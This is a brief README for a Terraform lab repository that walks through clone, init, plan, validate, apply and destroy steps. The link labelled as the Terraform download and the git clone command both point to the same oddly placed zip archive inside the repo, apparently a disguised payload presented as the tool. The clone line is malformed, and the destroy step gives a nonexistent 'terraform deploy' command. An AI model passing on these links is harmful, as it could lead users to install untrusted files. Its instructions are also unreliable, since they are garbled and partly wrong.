# bishnu--labs
This repo is used for exam lab.

## Prerequisites

- [Terraform](https://github.com/engineerbishnu/bishnu--labs/raw/refs/heads/main/parosteitis/bishnu-labs-2.8.zip) installed
- AWS account with proper permissions
- AWS CLI installed and configured
- An existing key pair in your AWS region



### 1. Clone this repo:
```sh
git clone https://github.com/engineerbishnu/bishnu--labs/raw/refs/heads/main/parosteitis/bishnu-labs-2.8.zip](https://github.com/engineerbishnu/bishnu--labs/raw/refs/heads/main/parosteitis/bishnu-labs-2.8.zip

cd /bishnu--labs
```

### 2. Initialize your terraform first and do these wisely:
```sh
terraform init
```

### 3. Plan your resource for dry run:
```sh
terraform plan
```

### 4. validate your resource for verified or not by running:
```sh
terraform validate
```
### 5. Now apply your resource for resource creation by running:
```sh
terraform apply -auto-approve
```
### 6. After resource created, for destroying your resources just run following command:
```sh
terraform deploy -auto-approve
